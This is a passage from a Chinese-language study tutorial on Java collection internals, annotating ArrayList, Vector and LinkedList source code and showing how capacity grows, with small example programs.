}\n\n    /**\n     * 返回此列表中指定元素的最后一次出现的索引，如果此列表不包含元素，则返回-1。.\n     */\n    public int lastIndexOf(Object o) {\n        if (o == null) {\n            for (int i = size-1; i >= 0; i--)\n                if (elementData[i]==null)\n                    return i;\n        } else {\n            for (int i = size-1; i >= 0; i--)\n                if (o.equals(elementData[i]))\n                    return i;\n        }\n        return -1;\n    }\n\n    /**\n     * 返回此ArrayList实例的浅拷贝。 （元素本身不被复制。）\n     */\n    public Object clone() {\n        try {\n            ArrayList<?> v = (ArrayList<?>) super.clone();\n            //Arrays.copyOf功能是实现数组的复制，返回复制后的数组。参数是被复制的数组和复制的长度\n            v.elementData = Arrays.copyOf(elementData, size);\n            v.modCount = 0;\n            return v;\n        } catch (CloneNotSupportedException e) {\n            // 这不应该发生，因为我们是可以克隆的\n            throw new InternalError(e);\n        }\n    }\n\n    /**\n     *以正确的顺序（从第一个到最后一个元素）返回一个包含此列表中所有元素的数组。\n     *返回的数组将是“安全的”，因为该列表不保留对它的引用。 （换句话说，这个方法必须分配一个新的数组）。\n     *因此，调用者可以自由地修改返回的数组。 此方法充当基于阵列和基于集合的API之间的桥梁。\n     */\n    public Object[] toArray() {\n        return Arrays.copyOf(elementData, size);\n    }\n\n    /**\n     * 以正确的顺序返回一个包含此列表中所有元素的数组（从第一个到最后一个元素）;\n     *返回的数组的运行时类型是指定数组的运行时类型。 如果列表适合指定的数组，则返回其中。\n     *否则，将为指定数组的运行时类型和此列表的大小分配一个新数组。\n     *如果列表适用于指定的数组，其余空间（即数组的列表数量多于此元素），则紧跟在集合结束后的数组中的元素设置为null 。\n     *（这仅在调用者知道列表不包含任何空元素的情况下才能确定列表的长度。）\n     */\n    @SuppressWarnings(\"unchecked\")\n    public <T> T[] toArray(T[] a) {\n        if (a.length < size)\n            // 新建一个运行时类型的数组，但是ArrayList数组的内容\n            return (T[]) Arrays.copyOf(elementData, size, a.getClass());\n            //调用System提供的arraycopy()方法实现数组之间的复制\n        System.arraycopy(elementData, 0, a, 0, size);\n        if (a.length > size)\n            a[size] = null;\n        return a;\n    }\n\n    // Positional Access Operations\n\n    @SuppressWarnings(\"unchecked\")\n    E elementData(int index) {\n        return (E) elementData[index];\n    }\n\n    /**\n     * 返回此列表中指定位置的元素。\n     */\n    public E get(int index) {\n        rangeCheck(index);\n\n        return elementData(index);\n    }\n\n    /**\n     * 用指定的元素替换此列表中指定位置的元素。\n     */\n    public E set(int index, E element) {\n        //对index进行界限检查\n        rangeCheck(index);\n\n        E oldValue = elementData(index);\n        elementData[index] = element;\n        //返回原来在这个位置的元素\n        return oldValue;\n    }\n\n    /**\n     * 将指定的元素追加到此列表的末尾。\n     */\n    public boolean add(E e) {\n        ensureCapacityInternal(size + 1);  // Increments modCount!!\n        //这里看到ArrayList添加元素的实质就相当于为数组赋值\n        elementData[size++] = e;\n        return true;\n    }\n\n    /**\n     * 在此列表中的指定位置插入指定的元素。\n     *先调用 rangeCheckForAdd 对index进行界限检查；然后调用 ensureCapacityInternal 方法保证capacity足够大；\n     *再将从index开始之后的所有成员后移一个位置；将element插入index位置；最后size加1。\n     */\n    public void add(int index, E element) {\n        rangeCheckForAdd(index);\n\n        ensureCapacityInternal(size + 1);  // Increments modCount!!\n        //arraycopy()这个实现数组之间复制的方法一定要看一下，下面就用到了arraycopy()方法实现数组自己复制自己\n        System.arraycopy(elementData, index, elementData, index + 1,\n                         size - index);\n        elementData[index] = element;\n        size++;\n    }\n\n    /**\n     * 删除该列表中指定位置的元素。 将任何后续元素移动到左侧（从其索引中减去一个元素）。\n     */\n    public E remove(int index) {\n        rangeCheck(index);\n\n        modCount++;\n        E oldValue = elementData(index);\n\n        int numMoved = size - index - 1;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index+1, elementData, index,\n                             numMoved);\n        elementData[--size] = null; // clear to let GC do its work\n      //从列表中删除的元素\n        return oldValue;\n    }\n\n    /**\n     * 从列表中删除指定元素的第一个出现（如果存在）。 如果列表不包含该元素，则它不会更改。\n     *返回true，如果此列表包含指定的元素\n     */\n    public boolean remove(Object o) {\n        if (o == null) {\n            for (int index = 0; index < size; index++)\n                if (elementData[index] == null) {\n                    fastRemove(index);\n                    return true;\n                }\n        } else {\n            for (int index = 0; index < size; index++)\n                if (o.equals(elementData[index])) {\n                    fastRemove(index);\n                    return true;\n                }\n        }\n        return false;\n    }\n\n    /*\n     * Private remove method that skips bounds checking and does not\n     * return the value removed.\n     */\n    private void fastRemove(int index) {\n        modCount++;\n        int numMoved = size - index - 1;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index+1, elementData, index,\n                             numMoved);\n        elementData[--size] = null; // clear to let GC do its work\n    }\n\n    /**\n     * 从列表中删除所有元素。\n     */\n    public void clear() {\n        modCount++;\n\n        // 把数组中所有的元素的值设为null\n        for (int i = 0; i < size; i++)\n            elementData[i] = null;\n\n        size = 0;\n    }\n\n    /**\n     * 按指定集合的Iterator返回的顺序将指定集合中的所有元素追加到此列表的末尾。\n     */\n    public boolean addAll(Collection<? extends E> c) {\n        Object[] a = c.toArray();\n        int numNew = a.length;\n        ensureCapacityInternal(size + numNew);  // Increments modCount\n        System.arraycopy(a, 0, elementData, size, numNew);\n        size += numNew;\n        return numNew != 0;\n    }\n\n    /**\n     * 将指定集合中的所有元素插入到此列表中，从指定的位置开始。\n     */\n    public boolean addAll(int index, Collection<? extends E> c) {\n        rangeCheckForAdd(index);\n\n        Object[] a = c.toArray();\n        int numNew = a.length;\n        ensureCapacityInternal(size + numNew);  // Increments modCount\n\n        int numMoved = size - index;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index, elementData, index + numNew,\n                             numMoved);\n\n        System.arraycopy(a, 0, elementData, index, numNew);\n        size += numNew;\n        return numNew != 0;\n    }\n\n    /**\n     * 从此列表中删除所有索引为fromIndex （含）和toIndex之间的元素。\n     *将任何后续元素移动到左侧（减少其索引）。\n     */\n    protected void removeRange(int fromIndex, int toIndex) {\n        modCount++;\n        int numMoved = size - toIndex;\n        System.arraycopy(elementData, toIndex, elementData, fromIndex,\n                         numMoved);\n\n        // clear to let GC do its work\n        int newSize = size - (toIndex-fromIndex);\n        for (int i = newSize; i < size; i++) {\n            elementData[i] = null;\n        }\n        size = newSize;\n    }\n\n    /**\n     * 检查给定的索引是否在范围内。\n     */\n    private void rangeCheck(int index) {\n        if (index >= size)\n            throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n    }\n\n    /**\n     * add和addAll使用的rangeCheck的一个版本\n     */\n    private void rangeCheckForAdd(int index) {\n        if (index > size || index < 0)\n            throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n    }\n\n    /**\n     * 返回IndexOutOfBoundsException细节信息\n     */\n    private String outOfBoundsMsg(int index) {\n        return \"Index: \"+index+\", Size: \"+size;\n    }\n\n    /**\n     * 从此列表中删除指定集合中包含的所有元素。\n     */\n    public boolean removeAll(Collection<?> c) {\n        Objects.requireNonNull(c);\n        //如果此列表被修改则返回true\n        return batchRemove(c, false);\n    }\n\n    /**\n     * 仅保留此列表中包含在指定集合中的元素。\n     *换句话说，从此列表中删除其中不包含在指定集合中的所有元素。\n     */\n    public boolean retainAll(Collection<?> c) {\n        Objects.requireNonNull(c);\n        return batchRemove(c, true);\n    }\n\n\n    /**\n     * 从列表中的指定位置开始，返回列表中的元素（按正确顺序）的列表迭代器。\n     *指定的索引表示初始调用将返回的第一个元素为next 。 初始调用previous将返回指定索引减1的元素。\n     *返回的列表迭代器是fail-fast 。\n     */\n    public ListIterator<E> listIterator(int index) {\n        if (index < 0 || index > size)\n            throw new IndexOutOfBoundsException(\"Index: \"+index);\n        return new ListItr(index);\n    }\n\n    /**\n     *返回列表中的列表迭代器（按适当的顺序）。\n     *返回的列表迭代器是fail-fast 。\n     */\n    public ListIterator<E> listIterator() {\n        return new ListItr(0);\n    }\n\n    /**\n     *以正确的顺序返回该列表中的元素的迭代器。\n     *返回的迭代器是fail-fast 。\n     */\n    public Iterator<E> iterator() {\n        return new Itr();\n    }\n```\n\n### 扩容机制\n\n> 为了方便复习先给出扩容源码分析的结论，然后再进行详细分析，分析流程是先把创建和扩容用到的属性和方法单独讲解，然后模拟一个场景来一步一步来 debug\n\n#### 结论\n\n- 1.ArrayList 中维护了一个 Object 类型的数组 elementData\n  - transient Object[] elementData; //transient表示瞬间,短暂的，表示该属性不会被序\n    列化\n\n- 2.创建 ArrayList 对象时，如果使用的是无参构造器，则初始 elementData 容量为 0\n  - 第 1 次添加，则扩容 elementData 为 10\n  - 如需再次扩容，则扩容 elementData 为 1.5 倍\n- 3.创建 ArrayList 对象时，如果使用的是指定大小的构造器，则初始 elementData 容量为指定大小\n  - 如果需要扩容，则直接扩容 elementData 为 1.5 倍\n\n#### 属性&方法\n\n如下是 ArrayList 创建和扩容用到的主要属性和方法，这里先列出来，后面再详细讲解\n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable {\n    // 默认初始的容量\n    private static final int DEFAULT_CAPACITY = 10;\n    // 一个空数组\n    private static final Object[] EMPTY_ELEMENTDATA = {};\n    // 一个空数组，如果使用无参构造函数创建，则使用该值\n    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n    // 当前数据对象存放地方，当前对象不参与序列化\n    transient Object[] elementData;\n    // 当前数组所包含的元素个数\n    private int size;\n    // 数组最大长度\n    private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n  \n    //protected transient int modCount = 0;\n    // modCount属性从AbstractList继承过来的，代表ArrayList集合的修改次数。\n  \n  \t//如下是ArrayList创建和扩容主要方法，省略了方法体\n  \n    public ArrayList(int initialCapacity) {}\n   \n    public ArrayList() {}\n\n    public ArrayList(Collection<? extends E> c) {}\n  \n    public boolean add(E e) {}\n\n    public void ensureCapacity(int minCapacity) {}\n\n    private static int calculateCapacity(Object[] elementData, int minCapacity) {}\n\n    private void ensureCapacityInternal(int minCapacity) {}\n\n    private void ensureExplicitCapacity(int minCapacity) {}\n\n    private void grow(int minCapacity) {}\n\n    private static int hugeCapacity(int minCapacity) {}\n}\n```\n\n#### 构造函数\n\n##### 无参构造函数\n\n```java\npublic ArrayList() {\n  this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\n##### 带int类型构造函数\n\n```java\npublic ArrayList(int initialCapacity) {\n  if (initialCapacity > 0) {//初始容量大于0\n    //创建initialCapacity大小的数组\n    this.elementData = new Object[initialCapacity];\n  } else if (initialCapacity == 0) {//初始容量等于0\n    //创建空数组\n    this.elementData = EMPTY_ELEMENTDATA;\n  } else {//初始容量小于0，抛出异常\n    throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                       initialCapacity);\n  }\n}\n```\n\n##### 带Collection对象构造函数\n\n```java\npublic ArrayList(Collection<? extends E> c) {\n  Object[] a = c.toArray();\n  if ((size = a.length) != 0) {\n    if (c.getClass() == ArrayList.class) {\n      elementData = a;\n    } else {\n      elementData = Arrays.copyOf(a, size, Object[].class);\n    }\n  } else {\n    // replace with empty array.\n    elementData = EMPTY_ELEMENTDATA;\n  }\n}\n```\n\n#### 扩容方法\n\n##### add\n\n```java\n//将指定的元素追加到此列表的末尾\npublic boolean add(E e) {\n  //添加元素之前，先调用ensureCapacityInternal方法\n  ensureCapacityInternal(size + 1);  // Increments modCount!!\n  //这里看到ArrayList添加元素的实质就相当于为数组赋值\n  elementData[size++] = e;\n  return true;\n}\n```\n\n##### ensureCapacityInternal\n\n```java\n//得到最小扩容量\nprivate void ensureCapacityInternal(int minCapacity) {\n  if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n    // 获取默认的容量和传入参数的较大值\n    minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);\n  }\n  ensureExplicitCapacity(minCapacity);\n}\n```\n\n当 要 add 进第 1 个元素时，minCapacity 为 1，在 Math.max()方法比较后，minCapacity 为 10。\n\n##### ensureExplicitCapacity\n\n如果调用 `ensureCapacityInternal()` 方法就一定会进入（执行）这个方法\n\n```java\n//判断是否需要扩容\nprivate void ensureExplicitCapacity(int minCapacity) {\n  modCount++;\n  // overflow-conscious code\n  if (minCapacity - elementData.length > 0)\n    //调用grow方法进行扩容，调用此方法代表已经开始扩容了\n    grow(minCapacity);\n}\n```\n\n- 当我们要 add 进第 1 个元素到 ArrayList 时，elementData.length 为 0 （因为还是一个空的 list），因为执行了 `ensureCapacityInternal()` 方法 ，所以 minCapacity 此时为 10。此时，`minCapacity - elementData.length > 0`成立，所以会进入 `grow(minCapacity)` 方法。\n- 当 add 第 2 个元素时，minCapacity 为 2，此时 e lementData.length(容量)在添加第一个元素后扩容成 10 了。此时，`minCapacity - elementData.length > 0` 不成立，所以不会进入 （执行）`grow(minCapacity)` 方法。\n- 添加第 3、4···到第 10 个元素时，依然不会执行 grow 方法，数组容量都为 10。\n\n##### grow\n\n```java\n//要分配的最大数组大小\nprivate static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n\n//ArrayList扩容的核心方法。\nprivate void grow(int minCapacity) {\n  // oldCapacity为旧容量，newCapacity为新容量\n  int oldCapacity = elementData.length;\n  //将oldCapacity 右移一位，其效果相当于oldCapacity /2，\n  //我们知道位运算的速度远远快于整除运算，整句运算式的结果就是将新容量更新为旧容量的1.5倍，\n  int newCapacity = oldCapacity + (oldCapacity >> 1);\n  //然后检查新容量是否大于最小需要容量，若还是小于最小需要容量，那么就把最小需要容量当作数组的新容量，\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  // 如果新容量大于 MAX_ARRAY_SIZE,进入(执行) `hugeCapacity()` 方法来比较 minCapacity 和 MAX_ARRAY_SIZE，\n  //如果minCapacity大于最大容量，则新容量则为`Integer.MAX_VALUE`，否则，新容量大小则为 MAX_ARRAY_SIZE 即为 `Integer.MAX_VALUE - 8`。\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  // minCapacity is usually close to size, so this is a win:\n  elementData = Arrays.copyOf(elementData, newCapacity);//扩容\n}\n```\n\nArrayList 每次扩容之后容量都会变为原来的 1.5 倍左右（oldCapacity 为偶数就是 1.5 倍，否则是 1.5 倍左右）！ 奇偶不同，比如 ：10+10/2 = 15, 33+33/2=49。如果是奇数的话会丢掉小数.\n\n \">>\"（移位运算符）：>>1 右移一位相当于除 2，右移 n 位相当于除以 2 的 n 次方。这里 oldCapacity 明显右移了 1 位所以相当于 oldCapacity /2。对于大数据的 2 进制运算,位移运算符比那些普通运算符的运算要快很多,因为程序仅仅移动一下而已，不去计算，这样提高了效率，节省了资源\n\n##### hugeCapacity\n\n如果新容量大于 MAX_ARRAY_SIZE，进入(执行) `hugeCapacity()` 方法来比较 minCapacity 和 MAX_ARRAY_SIZE\n\n```java\nprivate static int hugeCapacity(int minCapacity) {\n  if (minCapacity < 0) // overflow\n    throw new OutOfMemoryError();\n  //对minCapacity和MAX_ARRAY_SIZE进行比较\n  //若minCapacity大，将Integer.MAX_VALUE作为新数组的大小\n  //若MAX_ARRAY_SIZE大，将MAX_ARRAY_SIZE作为新数组的大小\n  //MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n  return (minCapacity > MAX_ARRAY_SIZE) ?Integer.MAX_VALUE :\n  MAX_ARRAY_SIZE;\n}\n```\n\n如果 minCapacity 大于最大容量，则新容量则为`Integer.MAX_VALUE`，否则，新容量大小则为 MAX_ARRAY_SIZE 即为 `Integer.MAX_VALUE - 8`\n\n![扩容流程](https://img.jwt1399.top/img/202208232323066.jpg)\n\n#### 扩容场景模拟\n\n##### 案例1：无参构造函数\n\n```java\n//模拟代码\nimport java.util.ArrayList;\npublic class ArrayListSource {\n    public static void main(String[] args) {\n        //使用无参构造器创建ArrayList 对象\n        ArrayList list = new ArrayList();\n\t\t\t\t\n        //使用for 给list 集合添加1-10 数据\n        for (int i = 1; i <= 10; i++) {\n            list.add(i);\n        }\n        //使用for 给list 集合添加11-15 数据\n        for (int i = 11; i <= 15; i++) {\n            list.add(i);\n        }\n    }\n}\n```\n\n###### Step1\n\n执行`ArrayList list = new ArrayList();`\n\n```java\n//该步骤底层代码\nprivate static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\ntransient Object[] elementData;\n\npublic ArrayList() {\n  this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\n执行时会调用无参数构造方法创建  ArrayList  ，实际上创建了一个名为`elementData` 的`Object[]` 空数组，也就是说该数组可以放任何对象\n\n###### Step2\n\n执行 `  for (int i = 1; i <= 10; i++) {list.add(i);}`\n\n```java\n//该步骤底层代码\nprivate int size;// 当前数组所包含的元素个数\npublic boolean add(E e) {\n  ensureCapacityInternal(size + 1);  \n  elementData[size++] = e;\n  return true;\n}\n```\n\n添加元素之前，先调用 `ensureCapacityInternal` 方法\n\n```java\n//得到最小扩容量\nprivate void ensureCapacityInternal(int minCapacity) {\n    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));\n}\n\n//计算最小扩容量\nprivate static int calculateCapacity(Object[] elementData, int minCapacity) {\n     // 如果元素数组为默认的空\n    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n        // 获取“默认的容量”和“传入参数 minCapacity ”两者之间的最大值\n        return Math.max(DEFAULT_CAPACITY, minCapacity);\n    }\n    return minCapacity;\n}\n```\n\n当要 add 进第 1 个元素时，minCapacity 为 1，DEFAULT_CAPACITY 为 10，在 Math.max() 方法比较后，minCapacity 为 10，然后调用 `ensureExplicitCapacity` 方法\n\n```java\n//判断是否需要扩容\nprivate void ensureExplicitCapacity(int minCapacity) {\n        modCount++;//记录修改次数\n        if (minCapacity - elementData.length > 0)\n            grow(minCapacity);\n}\n```\n\n当要 add 进第 1 个元素时，`elementData.length = 0` （因为还是一个空的 list），因为上步骤执行了 ensureCapacityInternal()  方法 ，所以 `minCapacity = 10`。此时，`minCapacity - elementData.length > 0`成立，所以**会执行** `grow()` 方法。\n\n```java\n//扩容方法\nprivate void grow(int minCapacity) {\n  // 取到旧数组的长度\n  int oldCapacity = elementData.length;\n  //计算新数组的长度\n  //>>是移位运算符，相当于int newCapacity = oldCapacity + (oldCapacity/2)，但性能会好一些\n  int newCapacity = oldCapacity + (oldCapacity >> 1);\n  //保证长度在正常范围内\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  // 用计算出来的数组长度,往下传继续处理\n  elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\n此时 oldCapacity 为 0，经比较后第一个 if 判断成立，newCapacity =  10。但是第二个 if 判断不会成立，即 newCapacity 不比 MAX_ARRAY_SIZE 大，则不会执行 `hugeCapacity` 方法。然后调用 `Arrays.copyOf()` 方法进行扩容，数组扩容为 10，add 方法中 return true,size 增为 1。\n\n- 当 add 第 2 个元素时，minCapacity 为 2，此时 elementData.length 在添加第一个元素后扩容成 10 了。此时，`minCapacity - elementData.length > 0` 不成立，所以`不会执行 grow()` 方法。\n\n- 添加第 3、4···到第 10 个元素时，依然`不会执行 grow()` 方法，数组容量都为 10。\n\n- 直到添加第 11 个元素，minCapacity(为 11)比 elementData.length（为 10）要大。进入 grow () 方法进行扩容\n\n###### Step3\n\n执行 `  for (int i = 11; i <= 15; i++) {list.add(i);}`\n\n- 当 add 第 11 个元素进入 grow() 方法时，newCapacity 为 15，比 minCapacity 为 11大，第一个 if 判断不成立。新容量没有大于数组最大 size，不会进入 hugeCapacity 方法。扩容 elementData 为 1.5 倍，数组容量扩为 15，add 方法中 return true，size 增为 11。\n\n- 以此类推······\n\n##### 案例2：有参构造函数\n\n```java\npackage com.jwt.list_;\nimport java.util.ArrayList;\n\npublic class ArrayListSource {\n    public static void main(String[] args) {\n        //使用有参构造器创建ArrayList 对象\n\t\t\t\tArrayList list = new ArrayList(8);\n      \n        //使用for 给list 集合添加1-10 数据\n        for (int i = 1; i <= 10; i++) {\n            list.add(i);\n        }\n        //使用for 给list 集合添加11-15 数据\n        for (int i = 11; i <= 15; i++) {\n            list.add(i);\n        }\n        list.add(100);\n        list.add(200);\n        list.add(null);\n    }\n}\n```\n\n有参构造与上面无参构造类似，区别在于第一步，有参构造是以传入的参数创建了一个名为`elementData` 的`Object[指定大小]` 空数组 ，如果需要扩容，也是调用无参构造相同的方法来进行扩容，第一次扩容就按照 elementData 的 1.5 倍扩容\n\n## 1.2 Vector\n\n### 特点\n\n```java\npublic class Vector<E>\n    extends AbstractList<E>\n    implements List<E>, RandomAccess, Cloneable, java.io.Serializable{}\n```\n\n- Vector 底层也是一个对象数组\n  - `protected Object[] elementData;`\n\n- Vector是线程同步的，即线程安全，Vector 类的操作方法带有 synchronized\n\n  ```java\n  public synchronized boolean add(E e) {\n    modCount++;\n    ensureCapacityHelper(elementCount + 1);\n    elementData[elementCount++] = e;\n    return true;\n  }\n  ```\n\n- 需要线程同步安全是，考虑使用\n\n### 扩容机制\n\n#### 结论\n\n- 1、创建 Vector 对象时，如果使用的是无参构造器，则初始 elementData 容量为 0\n  - 第 1 次添加，则扩容 elementData 为 10\n  - 如需再次扩容，则扩容 elementData 为 2 倍\n- 2、创建 Vector 对象时，如果使用的是指定大小的构造器，则初始 elementData 容量为指定大小\n  - 如果需要扩容，则直接扩容 elementData 为 2倍\n- 3、创建 Vector 对象时，如果使用的是指定大小和增量的构造器(自定义扩容)，则初始 elementData 容量为指定大小\n  - 如果需要扩容，则直接扩容原容量+容量增量\n\n#### 构造函数\n\n```java\npublic Vector(int initialCapacity, int capacityIncrement) {\n  super();\n  if (initialCapacity < 0)\n    throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                       initialCapacity);\n  this.elementData = new Object[initialCapacity];\n  this.capacityIncrement = capacityIncrement;\n}\n\npublic Vector(int initialCapacity) {\n  this(initialCapacity, 0);//0代表容量增量\n}\n\n\npublic Vector() {\n  this(10);\n}\n\npublic Vector(Collection<? extends E> c) {\n  Object[] a = c.toArray();\n  elementCount = a.length;\n  if (c.getClass() == ArrayList.class) {\n    elementData = a;\n  } else {\n    elementData = Arrays.copyOf(a, elementCount, Object[].class);\n  }\n}\n```\n\n#### 扩容方法\n\n##### add\n\n```java\npublic synchronized boolean add(E e) {\n  modCount++;\n  ensureCapacityHelper(elementCount + 1);\n  elementData[elementCount++] = e;\n  return true;\n}\n```\n\n##### ensureCapacityHelper\n\n```java\nprivate void ensureCapacityHelper(int minCapacity) {\n  // overflow-conscious code\n  if (minCapacity - elementData.length > 0)\n    grow(minCapacity);\n}\n```\n\n判断最小容量是否超出 elementData 数组的长度，如果超出就调用 grow() 进行扩容\n\n##### grow\n\n```java\nprivate void grow(int minCapacity) {\n  // overflow-conscious code\n  int oldCapacity = elementData.length;\n  int newCapacity = oldCapacity + ((capacityIncrement > 0) ?\n                                   capacityIncrement : oldCapacity);\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\n- capacityIncrement 未指定的话，新容量就为原容量的 2 倍\n- capacityIncrement 指定的话，新容量就为原容量+容量增量\n\n### Vector和ArrayList对比\n\n|           | 底层结构 | 版本   | 线程安全/效率  | 扩容倍数                                                     |\n| --------- | -------- | ------ | -------------- | ------------------------------------------------------------ |\n| ArrayList | 可变数组 | Jdk1.2 | 不安全、效率高 | 如果无参构造第一次10，第二次1.5倍；如果有参数构造按1.5倍扩   |\n| Vector    | 可变数组 | Jdk1.0 | 安全、效率不高 | 如果无参构造默认10，第二次2倍；如果有参数构造按2倍扩；如果指定增量按增量扩 |\n\n## 1.3 LinkedList\n\n###  特点\n\n![](https://img.jwt1399.top/img/202208232322266.png)\n\n```java\npublic class LinkedList<E>\n    extends AbstractSequentialList<E>\n    implements List<E>, Deque<E>, Cloneable, java.io.Serializable\n```\n\n- LinkedList底层实现了双向链表和双端队列特点，和 Deque 接口\n- 可以添加任意元素(元素可以重复)，包括 null\n- 线程不安全，没有实现同步\n\n模拟一个简单的双向链表\n\n```java\n//定义一个Node 类，Node 对象表示双向链表的一个结点\nclass Node {\n    public Object item; //真正存放数据\n    public Node next; //指向后一个结点\n    public Node pre; //指向前一个结点\n\n    public Node(Object name) {\n        this.item = name;\n    }\n    public String toString() {\n        return \"Node name=\" + item;\n    }\n}\n```\n\n使用双向链表\n\n```java\npackage com.jwt.list_;\n\npublic class LinkedList01 {\n    public static void main(String[] args) {\n        //模拟一个简单的双向链表\n        Node jack = new Node(\"jack\");\n        Node tom = new Node(\"tom\");\n        Node jwt = new Node(\"jwt\");\n        //连接三个结点，形成双向链表\n        //jack -> tom -> jwt\n        jack.next = tom;\n        tom.next = jwt;\n        //jwt -> tom -> jack\n        jwt.pre = tom;\n        tom.pre = jack;\n        Node first = jack; //让first 引用指向jack,就是双向链表的头结点\n        Node last = jwt; //让last 引用指向jwt,就是双向链表的尾结点\n        //从头到尾进行遍历\n        System.out.println(\"===从头到尾进行遍历===\");\n        while (true) {\n            if (first == null) {\n                break;\n            }\n            //输出first 信息\n            System.out.println(first);\n            first = first.next;\n        }\n        //从尾到头的遍历\n        System.out.println(\"===从尾到头的遍历===\");\n        while (true) {\n            if (last == null) {\n                break;\n            }\n            //输出last 信息\n            System.out.println(last);\n            last = last.pre;\n        }\n        //链表的添加对象/数据，是多么的方便\n        //要求，是在tom--jwt之间，插入一个对象smith\n        //1. 先创建一个Node 结点，name 就是smith\n        Node smith = new Node(\"smith\");\n        //下面就把smith 加入到双向链表了\n        smith.next = jwt;\n        smith.pre = tom;\n        jwt.pre = smith;\n        tom.next = smith;\n        //让first 再次指向jack\n        first = jack;//让first 引用指向jack,就是双向链表的头结点\n        System.out.println(\"===从头到尾进行遍历===\");\n        while (true) {\n            if (first == null) {\n                break;\n            }\n            //输出first 信息\n            System.out.println(first);\n            first = first.next;\n        }\n        last = jwt; //让last 重新指向最后一个结点\n        //从尾到头的遍历\n        System.out.println(\"===从尾到头的遍历===\");\n        while (true) {\n            if (last == null) {\n                break;\n            }\n            //输出last 信息\n            System.out.println(last);\n            last = last.pre;\n        }\n    }\n}\n```\n\n### 增删改查使用\n\n```java\npackage com.jwt.list_;\n\nimport java.util.Iterator;\nimport java.util.LinkedList;\n\npublic class LinkedListCRUD {\n    public static void main(String[] args) {\n        LinkedList linkedList = new LinkedList();\n        linkedList.add(1);\n        linkedList.add(2);\n        linkedList.add(3);\n        linkedList.add(4);\n        linkedList.add(4,5);\n        System.out.println(\"linkedList=\" + linkedList);\n        //演示一个删除结点的\n        linkedList.remove(); //默认删除的是第一个结点\n        linkedList.remove(2);//删除索引为2的结点\n        System.out.println(\"linkedList=\" + linkedList);\n        //修改某个结点对象\n        linkedList.set(1, 999);\n        System.out.println(\"linkedList=\" + linkedList);\n        //得到某个结点对象\n        Object o = linkedList.get(1);//得到双向链表的第二个对象\n        System.out.println(o);//999\n        //因为LinkedList 是实现了List 接口, 遍历方式\n        System.out.println(\"===LinkeList 遍历迭代器====\");\n        Iterator iterator = linkedList.iterator();\n        while (iterator.hasNext()) {\n            Object next = iterator.next();\n            System.out.println(\"next=\" + next);\n        }\n        System.out.println(\"===LinkeList 遍历增强for====\");\n        for (Object o1 : linkedList) {\n            System.out.println(\"o1=\" + o1);\n        }\n        System.out.println(\"===LinkeList 遍历普通for====\");\n        for (int i = 0; i < linkedList.size(); i++) {\n            System.out.println(linkedList.get(i));\n        }\n    }\n}\n```\n\n### 源码阅读\n\n- LinkedList 底层维护了一个双向链表\n\n- LinkedList 中维护了两个属性 first 和 last 分别指向首节点和尾节点\n- 每个结点(Node对象)，里面又维护了 prev、 next、 item 三个属性，其中通过 prev 指向前一个，通过 next 指向后一个节点，最终实现双向链表。\n- LinkedList 的元素的添加和删除，不是通过数组完成的，相对来说效率较高。\n\n#### 数据结构\n\n```java\n// 元素个数\ntransient int size = 0;\n// 链表头节点\ntransient Node<E> first;\n// 链表尾节点\ntransient Node<E> last;\n\n//链表节点结构\nprivate static class Node<E> {\n  //数据\n  E item;\n  // 前驱，后继指针\n  Node<E> next;\n  Node<E> prev;\n  // 构造函数\n  Node(Node<E> prev, E element, Node<E> next) {\n    this.item = element;\n    this.next = next;\n    this.prev = prev;\n  }\n}\n```\n\n#### 构造函数\n\n```java\n//无参构造\npublic LinkedList() {\n}\n\n//带Collection对象构造函数\npublic LinkedList(Collection<? extends E> c) {\n  this();\n  addAll(c);\n}\n```\n\n#### 增加结点\n\n##### 增加单个结点\n\n```java\n//默认增加\npublic boolean add(E e) {\n  linkLast(e);//调用增加尾结点方法\n  return true;\n}\n\n//根据索引增加\npublic void add(int index, E element) {\n  //判断下标是否越界，越界就抛出异常\n  checkPositionIndex(index);\n  //如果增加位置是尾部index，和上面调用的同一个方法\n  if (index == size)\n    linkLast(element);\n  else\n    linkBefore(element, node(index));\n}\n```\n\n##### 增加尾结点\n\n```java\nvoid linkLast(E e) {\n  //得到当前的最后一个元素节点\n  final Node<E> l = last;\n  //构造新节点，并设置当前上一个节点是l,元素为e,下一个节点为null\n  final Node<E> newNode = new Node<>(l, e, null);\n  //现在最新的last节点为新插入的节点\n  last = newNode;\n  //判断l节点是否为空，为空的话则代表当前插入的是第一个元素，则需要设置首节点也为当前的新节点，反之则设置原先的最后一个节点的next节点是当前新的节点\n  if (l == null)\n    first = newNode;\n  else\n    l.next = newNode;\n  //元素数量+1    \n  size++;\n  //链表改动次数+1\n  modCount++;\n}\n```\n\n##### 增加头结点\n\n```java\nprivate void linkFirst(E e) {\n    final 